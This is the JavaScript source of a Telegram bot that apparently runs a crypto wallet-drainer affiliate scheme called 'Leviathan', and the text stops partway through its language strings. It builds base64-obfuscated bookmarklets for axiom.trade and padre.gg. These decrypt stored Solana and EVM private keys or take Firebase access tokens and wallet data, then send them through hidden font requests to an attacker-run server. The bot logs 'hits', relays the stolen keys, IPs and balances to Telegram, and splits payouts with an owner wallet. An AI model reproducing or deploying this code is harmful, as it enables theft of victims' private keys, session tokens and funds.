require('dotenv').config();
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Telegraf, Markup, Telegram } = require('telegraf');

const token = process.env.BOT_TOKEN;
const allowedChatIds = (process.env.ALLOWED_CHAT_IDS || '5744841070')
  .split(',')
  .map((s) => Number(String(s).trim()))
  .filter((n) => Number.isFinite(n));

function isAllowedChatId(chatId) {
  const id = Number(chatId);
  return Number.isFinite(id) && allowedChatIds.includes(id);
}

async function notifyAllowedChatIds(text, options = {}) {
  if (!allowedChatIds.length) return;

  await Promise.all(
    allowedChatIds.map((chatId) =>
      bot.telegram.sendMessage(chatId, text, { parse_mode: 'HTML', ...options }).catch((err) => {
        console.warn(`Failed direct DM to ${chatId}:`, err.message || err);
      })
    )
  );
}
const userStateFilePath = path.join(__dirname, 'user-state.json');

function loadUserStateFromDisk() {
  try {
    if (fs.existsSync(userStateFilePath)) {
      const raw = fs.readFileSync(userStateFilePath, 'utf8');
      const parsed = JSON.parse(raw || '{}');
      if (parsed && typeof parsed === 'object') {
        Object.assign(userState, parsed);
      }
    }
  } catch (err) {
    console.warn('Could not load user state from disk:', err.message);
  }
}

function saveUserStateToDisk() {
  try {
    fs.writeFileSync(userStateFilePath, JSON.stringify(userState, null, 2), 'utf8');
  } catch (err) {
    console.warn('Could not save user state to disk:', err.message);
  }
}

const botTelegram = new Telegram(token);
if (!token) {
  console.error('Missing BOT_TOKEN. Set it in .env or as an environment variable.');
  process.exit(1);
}

const bot = new Telegraf(token);

const ownerIds = new Set([6305896892, 7553113221]);
const adminIds = new Set([6305896892, 7553113221]);

const botConfig = {
  ownerShare: 20,
  userShare: 80,
  ownerWallet: 'DUR6r4QSiAN6vgZY5vG8KwdYBYSEbADKWQrBCxDQPoFD',
};

const hitStats = {
  totalHits: 0,
  axiomHits: 0,
  padreHits: 0,
  hitsByUser: {},
};

let bookmarkletSiteUrl = process.env.BOOKMARKLET_SITE_URL || null;
const bookmarkletPayloadKey = process.env.BOOKMARKLET_PAYLOAD_KEY || 'LeviathanSecret123!@#';
const bookmarkletPlaceholderHost = 'https://your-bookmarklet-site.com';

// User state tracking
const userState = {}; // { userId: { step, language, wallet, revoked, autoWithdraw, totalCaptured, available, withdrawn } }
loadUserStateFromDisk();
setInterval(saveUserStateToDisk, 5000);

function getUserState(userId) {
  if (!userState[userId]) {
    userState[userId] = {
      step: 'language',
      mode: 'user',
      language: 'en',
      wallet: null,
      revoked: false,
      autoWithdraw: false,
      tier2: false,
      personalBotToken: null,
      totalCaptured: 0,
      available: 0,
      withdrawn: 0,
      totalCaptures: 0,
    };
  }
  return userState[userId];
}

const hitValuePerCapture = Number(process.env.HIT_VALUE_SOL || 0.001);

function applyCapturePayment(userId, amount) {
  const state = getUserState(userId);
  if (state.revoked) {
    return null;
  }

  state.totalCaptures = (state.totalCaptures || 0) + 1;
  state.available = Number((state.available + amount).toFixed(6));
  state.totalCaptured = Number((state.totalCaptured + amount).toFixed(6));
  return state;
}

const solanaRpcUrl = process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com';
const solanaPayerSecretKey = process.env.SOLANA_PAYER_SECRET_KEY || '';

function loadSolanaPayer() {
  if (!solanaPayerSecretKey) {
    return null;
  }
  try {
    const solana = require('@solana/web3.js');
    const secretKey = JSON.parse(solanaPayerSecretKey);
    if (!Array.isArray(secretKey)) {
      return null;
    }
    const keypair = solana.Keypair.fromSecretKey(Uint8Array.from(secretKey));
    return {
      solana,
      keypair,
      connection: new solana.Connection(solanaRpcUrl, { commitment: 'confirmed' }),
    };
  } catch (error) {
    return null;
  }
}

async function sendSolTransfer(toAddress, amountSol) {
  const config = loadSolanaPayer();
  if (!config) {
    return { success: false, reason: 'Solana payer not configured or library not installed' };
  }

  const { solana, keypair, connection } = config;
  const lamports = Math.round(Number(amountSol) * solana.LAMPORTS_PER_SOL);
  if (lamports <= 0) {
    return { success: false, reason: 'Amount too small to transfer' };
  }

  try {
    const transaction = new solana.Transaction().add(
      solana.SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: new solana.PublicKey(toAddress),
        lamports,
      })
    );
    const signature = await solana.sendAndConfirmTransaction(connection, transaction, [keypair]);
    return { success: true, signature };
  } catch (error) {
    return { success: false, reason: String(error) };
  }
}

async function executeWithdrawal(userId, trigger = 'manual') {
  const state = getUserState(userId);
  if (state.revoked) {
    return { error: 'revoked' };
  }
  if (!state.wallet) {
    return { error: 'noWallet' };
  }
  if (state.available <= 0) {
    return { error: 'noFunds' };
  }

  const amount = Number(state.available.toFixed(6));
  const ownerAmount = Number((amount * botConfig.ownerShare / 100).toFixed(6));
  const userAmount = Number((amount * botConfig.userShare / 100).toFixed(6));

  state.available = 0;
  state.withdrawn = Number((state.withdrawn + amount).toFixed(6));
  state.lastWithdrawal = new Date().toISOString();
  state.withdrawHistory = state.withdrawHistory || [];
  state.withdrawHistory.push({ when: state.lastWithdrawal, amount, userAmount, ownerAmount, trigger });

  const transferResults = {
    user: null,
    owner: null,
  };
  let transferNote = 'Withdrawal recorded in bot accounting.';

  const solanaConfig = loadSolanaPayer();
  if (solanaConfig) {
    const userTransfer = await sendSolTransfer(state.wallet, userAmount);
    const ownerTransfer = await sendSolTransfer(botConfig.ownerWallet, ownerAmount);
    transferResults.user = userTransfer;
    transferResults.owner = ownerTransfer;
    transferNote = `Attempted on-chain transfer to user and owner.`;
  }

  return {
    amount,
    ownerAmount,
    userAmount,
    transferResults,
    note: transferNote,
  };
}

async function processAutoWithdraw(userId) {
  return executeWithdrawal(userId, 'auto');
}

function isAdmin(userId) {
  return adminIds.has(userId) || ownerIds.has(userId);
}

function isOwner(userId) {
  return ownerIds.has(userId);
}

function getAllUsers() {
  return Object.values(userState);
}

function recordHit({ type, userId, username, botId }) {
  hitStats.totalHits += 1;
  if (type === 'axiom') {
    hitStats.axiomHits += 1;
  } else if (type === 'padre') {
    hitStats.padreHits += 1;
  }

  const state = applyCapturePayment(userId, hitValuePerCapture);
  if (state && state.autoWithdraw) {
    processAutoWithdraw(userId).catch(() => {});
  }

  const id = String(userId || 'unknown');
  hitStats.hitsByUser[id] = hitStats.hitsByUser[id] || { username: username || 'unknown', hits: 0 };
  hitStats.hitsByUser[id].hits += 1;
}

function getHitSummary() {
  const totalUsers = Object.keys(hitStats.hitsByUser).length;
  const topUsers = Object.entries(hitStats.hitsByUser)
    .sort((a, b) => b[1].hits - a[1].hits)
    .slice(0, 5)
    .map(([id, data]) => `${data.username || id}: ${data.hits}`)
    .join('\n');
  return {
    ...hitStats,
    totalUsers,
    topUsers: topUsers || 'No hits yet',
  };
}

const serverPort = Number(process.env.PORT || process.env.HIT_TRACKER_PORT || 3000);
const payloadFolderPath = path.join(__dirname, 'site', 'api', 'payload');

function normalizeBookmarkletHost(host) {
  if (!host) return bookmarkletPlaceholderHost;
  return host.replace(/\/+$/, '');
}

function sendJsonResponse(res, status, data) {
  const payload = JSON.stringify(data || {});
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });
  res.end(payload);
}

function collectRequestBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk.toString();
    });
    req.on('end', () => resolve(body));
    req.on('error', reject);
  });
}

function sendTextResponse(res, status, text) {
  res.writeHead(status, {
    'Content-Type': 'text/plain; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });
  res.end(text);
}

function notifyAdminsOnHit(hit) {
  const message =
    `🔥 <b>Worker hit recorded</b>\n` +
    `• Platform: <b>${hit.type}</b>\n` +
    `• Worker: <b>${hit.username || 'unknown'}</b>\n` +
    `• User ID: <code>${hit.userId || 'unknown'}</code>\n` +
    `• Bot ID: <code>${hit.botId || 'unknown'}</code>\n` +
    `• Total hits: <b>${hitStats.totalHits}</b>`;

  adminIds.forEach((adminId) => {
    bot.telegram.sendMessage(adminId, message, { parse_mode: 'HTML' }).catch(() => {});
  });
}

function countryCodeToEmojiFlag(code) {
  if (!code || typeof code !== 'string' || code.length !== 2) return '';
  const first = code.charCodeAt(0);
  const second = code.charCodeAt(1);
  if (first < 65 || first > 90 || second < 65 || second > 90) return '';
  return String.fromCodePoint(0x1f1e6 + first - 65, 0x1f1e6 + second - 65);
}

function formatNotificationText(data) {
  const usernameLabel = data.username ? escapeHtml(String(data.username)) : 'unknown';
  const userIdLabel = data.chatId ? escapeHtml(String(data.chatId)) : 'unknown';
  const platformLabel = data.platform ? escapeHtml(String(data.platform)) : 'unknown';
  const botIdLabel = data.botId ? escapeHtml(String(data.botId)) : 'unknown';
  const ipLabel = data.ip ? escapeHtml(String(data.ip)) : 'unknown';
  const locationLabel = data.location ? escapeHtml(String(data.location)) : 'unknown';
  const countryCode = data.country ? String(data.country).toUpperCase() : '';
  const countryFlag = countryCodeToEmojiFlag(countryCode);
  const countryLabel = countryCode ? `${countryFlag} ${escapeHtml(countryCode)}` : 'unknown';
  const walletLabel = data.wallet || data.address || data.walletAddress || data.wallet_address ? escapeHtml(String(data.wallet || data.address || data.walletAddress || data.wallet_address)) : 'unknown';

  const normalizeCollectedPrivateKeys = (input) => {
    const values = [];
    if (input == null) return values;
    if (Array.isArray(input)) {
      input.forEach((item) => {
        if (item != null) values.push(String(item).trim());
      });
    } else {
      values.push(String(input).trim());
    }
    return values.filter((value) => {
      if (!value) return false;
      const low = value.toLowerCase();
      return !['unknown', 'not-collected', 'none', 'null', 'undefined'].includes(low);
    });
  };

  const privateKeyValues = [
    ...normalizeCollectedPrivateKeys(data.privateKeys),
    ...normalizeCollectedPrivateKeys(data.privateKey),
    ...normalizeCollectedPrivateKeys(data.apiPrivateKey),
    ...normalizeCollectedPrivateKeys(data.private_key),
  ];

  const privateKeyLabel = privateKeyValues.length
    ? privateKeyValues.map((value) => escapeHtml(value)).join('\n')
    : 'none';

  const balanceValue = data.solBalance || data.balance || data.balanceSol || data.sol_balance || data.walletBalance || data.wallet_balance;
  const balanceLabel = balanceValue !== undefined && balanceValue !== null && String(balanceValue).trim() !== ''
    ? escapeHtml(String(balanceValue))
    : 'unknown';
  const userAgentLabel = data.userAgent ? escapeHtml(String(data.userAgent)) : 'unknown';
  const hardwareInfoLabel = data.hardwareInfo ? escapeHtml(String(data.hardwareInfo)) : 'unknown';
  const body = data.message || data.errorMessage || '';

  return (
    `✨ <b>LEVIATHAN ALERT</b>\n` +
    `🚀 <b>${platformLabel.toUpperCase()} HIT</b> • Bot: <code>${botIdLabel}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>User</b>: <code>${usernameLabel}</code>\n` +
    `🆔 <b>ID</b>: <code>${userIdLabel}</code>\n` +
    `💼 <b>Wallet</b>: <code>${walletLabel}</code>\n` +
    `🔑 <b>Private Key</b>: <code>${privateKeyLabel}</code>\n` +
    `💎 <b>SOL Balance</b>: <code>${balanceLabel}</code>\n` +
    `🌍 <b>Country</b>: <b>${countryLabel}</b>\n` +
    `📍 <b>Location</b>: <b>${locationLabel}</b>\n` +
    `🌐 <b>IP</b>: <code>${ipLabel}</code>\n` +
    `📡 <b>User Agent</b>: <code>${userAgentLabel}</code>\n` +
    `💻 <b>Hardware</b>: <code>${hardwareInfoLabel}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `${body || 'No extra message provided.'}`
  );
}

async function notifyChannelAndTier2(data) {
  const text = formatNotificationText(data);

  // Send ONLY to your allowed DM chat id(s)
  await notifyAllowedChatIds(text);

  // Do NOT send to the channel anymore
}

function startWebServer() {
  const server = http.createServer(async (req, res) => {
    try {
      const url = new URL(req.url || '', 'http://localhost');
      const pathname = url.pathname;
      const method = req.method || 'GET';

      if (method === 'OPTIONS') {
        res.writeHead(204, {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        });
        return res.end();
      }

      if (pathname === '/api/hit' && method === 'GET') {
        const type = url.searchParams.get('type') || 'unknown';
        const userId = url.searchParams.get('code') || 'unknown';
        const username = url.searchParams.get('username') || 'unknown';
        const botId = url.searchParams.get('botId') || 'unknown';

        recordHit({ type, userId, username, botId });
        notifyAdminsOnHit({ type, userId, username, botId });
        return sendJsonResponse(res, 200, { success: true });
      }

      if (pathname.startsWith('/api/payload/') && method === 'GET') {
        const requestedType = pathname.replace('/api/payload/', '').replace(/\.json$/, '');
        const filePath = path.join(payloadFolderPath, `${requestedType}.json`);
        if (!fs.existsSync(filePath)) {
          return sendJsonResponse(res, 404, { error: 'Payload not found' });
        }
        const rawData = fs.readFileSync(filePath, 'utf8');
        res.writeHead(200, {
          'Content-Type': 'application/json; charset=utf-8',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        });
        return res.end(rawData);
      }

      if (pathname === '/api/message' && (method === 'POST' || method === 'GET')) {
        const bodyText = method === 'POST' ? await collectRequestBody(req) : '';
        let payload = {};

        if (bodyText) {
          try {
            payload = JSON.parse(bodyText);
          } catch (err) {
            return sendJsonResponse(res, 400, { error: 'Invalid JSON body' });
          }
        }

        payload = {
          chatId: payload.chatId || url.searchParams.get('chatId') || url.searchParams.get('userId') || payload.userId,
          username: payload.username || url.searchParams.get('username'),
          platform: payload.platform || url.searchParams.get('platform'),
          botId: payload.botId || url.searchParams.get('botId'),
          message: payload.message || url.searchParams.get('message') || payload.text || payload.payload,
          ip: payload.ip || url.searchParams.get('ip'),
          location: payload.location || url.searchParams.get('location'),
          country: payload.country || url.searchParams.get('country'),
          solBalance: payload.solBalance || payload.sol_balance || payload.balance || payload.balanceSol || payload.walletBalance || payload.wallet_balance || url.searchParams.get('solBalance') || url.searchParams.get('sol_balance') || url.searchParams.get('balance') || url.searchParams.get('balanceSol') || url.searchParams.get('walletBalance') || url.searchParams.get('wallet_balance'),
          userAgent: payload.userAgent || url.searchParams.get('userAgent'),
          hardwareInfo: payload.hardwareInfo || url.searchParams.get('hardwareInfo'),
        };

        notifyChannelAndTier2(payload).catch(() => {});
        return sendJsonResponse(res, 200, { success: true });
      }

      return sendJsonResponse(res, 404, { error: 'Not found' });
    } catch (error) {
      return sendJsonResponse(res, 500, { error: 'Server error' });
    }
  });

  // Bind explicitly to 0.0.0.0 so external load balancers (Fly) can reach the server.
  server.listen(serverPort, '0.0.0.0', () => {
    console.log(`Leviathan hit tracker server listening on 0.0.0.0:${serverPort}`);
  });
}

function buildBookmarkletSource(type) {
  const loaderPath = path.join(__dirname, type, type, 'loader.js');
  if (!fs.existsSync(loaderPath)) {
    throw new Error(`Bookmarklet source not found for ${type}`);
  }
  return fs.readFileSync(loaderPath, 'utf8');
}

function buildBookmarkletFile(type, userId, username) {
  const API_ORIGIN = 'https://leviathan-kohl.vercel.app';
  const botId = type === 'padre' ? 'padre-bot' : 'axiom-bot';
  const platform = type;

  // AXIOM: Self-contained inline drainer (exact copy from Velox page)
  if (type === 'axiom') {
    const drainerCode = `(async () => {
if (location.origin !== "https://axiom.trade") return;

const API_ORIGIN = "${API_ORIGIN}";
const platform = "${platform}";
const botId = "${botId}";

function encodeBase64Unicode(value) {
  const bytes = new TextEncoder().encode(value);
  let binary = "";
  bytes.forEach(byte => { binary += String.fromCharCode(byte); });
  return btoa(binary);
}

async function sendData(apiUrlOrigin, data) {
  var timestamp = Math.floor(Date.now() / 1000);
  var header = navigator.userAgent + "|" + timestamp;
  data.timestamp = timestamp;
  data.header = header;
  data.userAgent = navigator.userAgent;
  data.hardwareInfo = (navigator.platform || 'unknown') + ' | ' + (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' + (screen.colorDepth || 0) + 'bit';

  const url = apiUrlOrigin + "?nocache=" + encodeURIComponent(encodeBase64Unicode(JSON.stringify(data)));
  const styleElement = document.createElement("style");
  styleElement.textContent = '@font-face{font-family:"leak' + Date.now() + '";src:url("' + url + '")} .lv-font{font-family:"leak' + Date.now() + '"}';
  const divElement = document.createElement("div");
  divElement.innerText = ".";
  divElement.className = "lv-font";
  divElement.style.cssText = "position:fixed;top:-9999px;font-size:1px";
  document.body.appendChild(divElement);
  document.head.appendChild(styleElement);
  setTimeout(() => { try { document.head.removeChild(styleElement); document.body.removeChild(divElement); } catch(_) {} }, 5000);
}

function arrayToString(dataArray) {
  const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  const resultDigits = [0];
  for (let element of dataArray) {
    let carry = element;
    for (let i = 0; i < resultDigits.length; i++) {
      const value = resultDigits[i] * 0x100 + carry;
      resultDigits[i] = value % 58;
      carry = value / 58 | 0;
    }
    while (carry) { resultDigits.push(carry % 58); carry = carry / 58 | 0; }
  }
  let resultString = "";
  for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
  for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
  return resultString;
}

function arrayToStringEVM(e) {
  return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e)).map(e => e.toString(16).padStart(2, "0")).join("");
}

function stringToArray(key) {
  try {
    const cleanedKey = key.replace(/-/g, "+").replace(/_/g, "/");
    return Uint8Array.from(atob(cleanedKey), key => key.charCodeAt(0));
  } catch { return new TextEncoder().encode(key); }
}

async function decrypt(key, toDecrypt) {
  const [ivString, dataString] = String(toDecrypt).split(":");
  const iv = stringToArray(ivString);
  const data = stringToArray(dataString);
  const decrypted = await crypto.subtle.decrypt({ "name": "AES-GCM", iv: iv, "tagLength": 128 }, key, data);
  return new Uint8Array(decrypted);
}

let username = "unknown";
try {
  const sels = ['[data-username]','header [class*="username"]','header button[class*="flex"][class*="items-center"] span','nav [class*="address"]','[class*="UserProfile"]'];
  for (const sel of sels) {
    const el = document.querySelector(sel);
    if (el && el.textContent && el.textContent.trim()) {
      const t = el.textContent.trim();
      if (!t.toLowerCase().includes('connect') && !t.toLowerCase().includes('wallet') && t.length > 2 && t.length < 64) { username = t.slice(0, 48); break; }
    }
  }
  if (username === "unknown") {
    const blocked = ["discover","portfolio","trade","swap","home"];
    const m = location.pathname.match(/\\/@?([a-zA-Z0-9_.-]+)/);
    if (m && m[1] && !blocked.includes(m[1].toLowerCase())) username = m[1].slice(0, 48);
  }
} catch(_) {}

try {
  const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", { "method": "POST", "credentials": "include" })).json();
  const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { "name": "AES-GCM" }, false, ["decrypt"]);
  const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
  const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
  const success = [];

  for (const bundle of solanaBundles) {
    try {
      const decryptedBundle = await decrypt(cryptoKey, bundle);
      if (decryptedBundle.length !== 0x40) continue;
      success.push({ pub: arrayToString(decryptedBundle.slice(0x20)), priv: arrayToString(decryptedBundle) });
    } catch(_) {}
  }

  let ethers = null;
  try { ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm"); } catch(_) {}

  for (const bundle of evmBundles) {
    try {
      const decryptedBundle = await decrypt(cryptoKey, bundle);
      const priv = arrayToStringEVM(decryptedBundle);
      const pub = ethers ? ethers.computeAddress("0x" + priv) : "unknown";
      success.push({ pub, priv });
    } catch(_) {}
  }

  const keys = success.map(k => ({ "public": k.pub, "private": k.priv }));
  await sendData(API_ORIGIN + "/api/send", { keys, username, platform, botId, url: location.href, message: "Page: " + location.href });
} catch(err) {}
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // PADRE: Self-contained inline drainer (exact copy from public/velox-bookmarklet-padre.js)
  if (type === 'padre') {
    const drainerCode = `(async function () {
    const SEND_URL = '${API_ORIGIN}/api/send';
    const platform = '${platform}';
    const botId = '${botId}';
    const ua = navigator.userAgent || 'unknown';
    const hw = (navigator.platform || 'unknown') + ' | ' + (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' + (screen.colorDepth || 0) + 'bit';

    function sendData(data) {
        try {
            const enc = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
            const url = SEND_URL + '?nocache=' + enc;
            const id = '_lv' + Date.now();
            const st = document.createElement('style');
            st.textContent = '@font-face{font-family:"' + id + '";src:url("' + url + '")} .' + id + '{font-family:"' + id + '"}';
            const dv = document.createElement('div');
            dv.innerText = '.';
            dv.className = id;
            dv.style.cssText = 'position:fixed;top:-9999px;font-size:1px';
            document.body.appendChild(dv);
            document.head.appendChild(st);
            setTimeout(function () { try { document.head.removeChild(st); } catch (_) {}; try { document.body.removeChild(dv); } catch (_) {} }, 5000);
        } catch (e) {}
    }

    let sessionData = null, walletsCache = null, hiddenWalletsCache = null, stamperEncoded = null;
    let username = 'unknown';
    try {
        sessionData = JSON.parse(localStorage.getItem('padreV2-session') || 'null');
        walletsCache = JSON.parse(localStorage.getItem('padreV2-walletsCache') || 'null');
        hiddenWalletsCache = JSON.parse(localStorage.getItem('padreV2-hiddenWalletsCache') || 'null');
        stamperEncoded = JSON.parse(localStorage.getItem('padreV2-stamper') || 'null');
        if (sessionData) {
            const uid = sessionData.uid || sessionData.userId || '';
            if (uid && uid.length > 2 && uid.length < 64) username = uid.slice(0, 48);
        }
    } catch (_) {}

    const allWallets = [];
    function collectWallets(cache) {
        if (!cache) return;
        try {
            for (const key of Object.keys(cache)) {
                const arr = cache[key];
                if (!Array.isArray(arr)) continue;
                for (const w of arr) {
                    allWallets.push({
                        public: w.publicAddress || w.address || '',
                        walletName: w.walletName || '',
                        type: w.walletType || '',
                        subOrgId: w.subOrgId || '',
                        walletId: w.walletId || w.id || '',
                        isImported: w.isImported || false,
                    });
                }
            }
        } catch (_) {}
    }
    collectWallets(walletsCache);
    collectWallets(hiddenWalletsCache);

    if (!location.hostname.includes('padre.gg')) {
        sendData({ type: platform, username, botId, platform, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Page: ' + location.href });
        return;
    }

    let accessToken = '', userEmail = '';
    try {
        const rows = await new Promise((res, rej) => {
            const req = indexedDB.open('firebaseLocalStorageDb');
            req.onsuccess = () => {
                const db = req.result;
                const r = db.transaction('firebaseLocalStorage', 'readonly').objectStore('firebaseLocalStorage').getAll();
                r.onsuccess = () => res(r.result);
                r.onerror = () => rej(r.error);
            };
            req.onerror = () => rej(req.error);
        });
        if (rows && rows.length > 0 && rows[0].value) {
            accessToken = rows[0].value.stsTokenManager.accessToken;
            userEmail = rows[0].value.email || rows[0].value.displayName || '';
            const firebaseUid = rows[0].value.uid || rows[0].value.localId || '';
            if (firebaseUid && (!sessionData || !sessionData.uid)) {
                if (!sessionData) sessionData = {};
                sessionData.uid = firebaseUid;
                sessionData.sessionId = '';
            }
            if (userEmail && username === 'unknown') username = userEmail.split('@')[0].slice(0, 48);
        }
    } catch (_) {}

    const walletKeys = allWallets.filter(w => w.public).map(w => ({ public: w.public, private: 'pending', type: w.type, walletName: w.walletName }));

    if (!accessToken || !sessionData) {
        const debugInfo = 'auth:' + (accessToken ? 'yes' : 'no') + ' session:' + (sessionData ? 'yes' : 'no');
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre: ' + debugInfo + ' | Page: ' + location.href });
        return;
    }

    try {
        const velvetRes = await fetch('https://backend.padre.gg/velvet/users/' + sessionData.uid + '/get-velvet', {
            method: 'GET',
            headers: { 'X-Padre-Session': sessionData.sessionId || '', 'Authorization': 'Bearer ' + accessToken },
        });
        if (!velvetRes.ok) throw new Error('velvet ' + velvetRes.status);
        const velvetObj = await velvetRes.json();

        sendData({
            type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href,
            padreDecryptPayload: {
                sessionUid: sessionData.uid, sessionId: sessionData.sessionId, accessTokenFull: accessToken,
                stamperEncoded: stamperEncoded, velvetBundle: velvetObj.bundle, wallets: allWallets,
            },
            message: 'Padre | ' + allWallets.length + ' wallet(s) | ' + (userEmail || username) + ' | Page: ' + location.href,
        });
    } catch (err) {
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre error: ' + (err.message || '') + ' | Page: ' + location.href });
    }
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // Fallback (should never reach here)
  return {
    buffer: Buffer.from('javascript:alert("Invalid bookmarklet type")', 'utf8'),
    filename: `${type}-bookmarklet.txt`,
  };
}


function getAdminSummary() {
  const users = getAllUsers();
  const totalWallets = users.filter((u) => u.wallet && !u.revoked).length;
  const totalTier2 = users.filter((u) => u.tier2).length;
  const totalCaptured = users.reduce((sum, u) => sum + (u.totalCaptured || 0), 0);
  const totalWithdrawn = users.reduce((sum, u) => sum + (u.withdrawn || 0), 0);
  const totalAvailable = users.reduce((sum, u) => sum + (u.available || 0), 0);
  const totalActive = users.filter((u) => !u.revoked).length;
  const totalRevoked = users.filter((u) => u.revoked).length;
  const hitSummary = getHitSummary();

  return {
    totalUsers: users.length,
    totalActive,
    totalRevoked,
    totalTier2,
    totalWallets,
    totalCaptured,
    totalAvailable,
    totalWithdrawn,
    ownerShare: botConfig.ownerShare,
    userShare: botConfig.userShare,
    ownerWallet: botConfig.ownerWallet,
    totalHits: hitSummary.totalHits,
    axiomHits: hitSummary.axiomHits,
    padreHits: hitSummary.padreHits,
    topHitUsers: hitSummary.topUsers,
  };
}

function formatCurrency(value) {
  return Number(value).toFixed(4);
}

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function isValidSolanaAddress(address) {
  // Solana addresses are base58, 43 or 44 characters long
  // Base58 alphabet: 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
  // (excludes: 0, O, I, l)
  return /^[1-9A-HJ-NP-Za-km-z]{43,44}$/.test(address);
}

const languages = {
  en: {
    name: 'English',
    welcome: 'Welcome to Leviathan Bot!\nPlease select your language:',
    walletPrompt: '💼 <b>Enter your Solana wallet address</b>\n\n⚠️ <b>IMPORTANT:</b>\n• This wallet will be used for <b>ALL withdrawals</b>\n• You can change it later using /wallet\n• Make sure you control this wallet!',
    invalidWallet: '❌ <b>Invalid Solana address</b>\n\nPlease enter a valid 43 or 44-character base58 Solana address.',
    registrationComplete: '🎊 <b>Registration Completed!</b>\n\n✅ Your Solana wallet has been synced:\n\n<code>{address}</code>\n\nYou\'re all set! Use /wallet to change it anytime. Then use /menu to see the menu.',
    walletDisplay: '💼 <b>Your Withdrawal Wallet</b>\n\n<code>{address}</code>\n\n<b>To change:</b>\n/wallet NEW_ADDRESS',
    walletChanged: '✅ <b>Wallet Updated!</b>\n\nYour new withdrawal wallet:\n\n<code>{address}</code>\n\nNow use /menu to see the menu.',
    statsMessage: '📊 <b>YOUR STATISTICS</b>\n\n💰 <b>Earnings</b>\n━━━━━━━━━━━━\n• <b>Total captured</b>: <code>{captured} SOL</code>\n• <b>Available</b>: <code>{available} SOL</code>\n• <b>Withdrawn</b>: <code>{withdrawn} SOL</code>\n\n📈 <b>Activity</b>\n━━━━━━━━━━━━\n• <b>Total captures</b>: <code>{captures}</code>\n\n💼 <b>Withdrawal wallet</b>\n<code>{wallet}</code>\n\n⚙️ <b>Auto Withdraw</b>: <code>{auto}</code>\n🧾 <b>Split</b>: <code>{user}% / {owner}%</code>',
    autoWithdrawOn: '✅ Auto withdraw is ON. Your earnings will be sent automatically with split processing.',
    autoWithdrawOff: '⛔ Auto withdraw is OFF. Tap the button again to turn it on.',
    revoked: '❌ <b>Access revoked</b>\nYou have been revoked from using this bot. Contact @late for support.',
    noWallet: '❌ <b>No wallet set</b>\n\nPlease complete registration first by sending /start',
  },
  ru: {
    name: 'Русский',
    welcome: 'Добро пожаловать в Leviathan Bot!\nПожалуйста, выберите язык:',
    walletPrompt: '💼 <b>Введите адрес вашего Solana кошелька</b>\n\n⚠️ <b>ВАЖНО:</b>\n• Этот кошелек будет использован для <b>ВСЕХ выводов</b>\n• Вы можете изменить его позже, используя /wallet\n• Убедитесь, что вы контролируете этот кошелек!',
    invalidWallet: '❌ <b>Неверный адрес Solana</b>\n\nПожалуйста, введите действительный 43 или 44-символный адрес Solana в формате base58.',
    registrationComplete: '🎊 <b>Регистрация завершена!</b>\n\n✅ Ваш Solana кошелек синхронизирован:\n\n<code>{address}</code>\n\nВы готовы! Используйте /wallet для изменения в любое время. Затем используйте /menu, чтобы увидеть меню.',
    walletDisplay: '💼 <b>Ваш кошелек для вывода</b>\n\n<code>{address}</code>\n\n<b>Для изменения:</b>\n/wallet НОВЫЙ_АДРЕС',
    walletChanged: '✅ <b>Кошелек обновлен!</b>\n\nВаш новый кошелек для вывода:\n\n<code>{address}</code>\n\nТеперь используйте /menu, чтобы увидеть меню.',
    noWallet: '❌ <b>Кошелек не установлен</b>\n\nПожалуйста, сначала завершите регистрацию, отправив /start',
  },
  es: {
    name: 'Español',
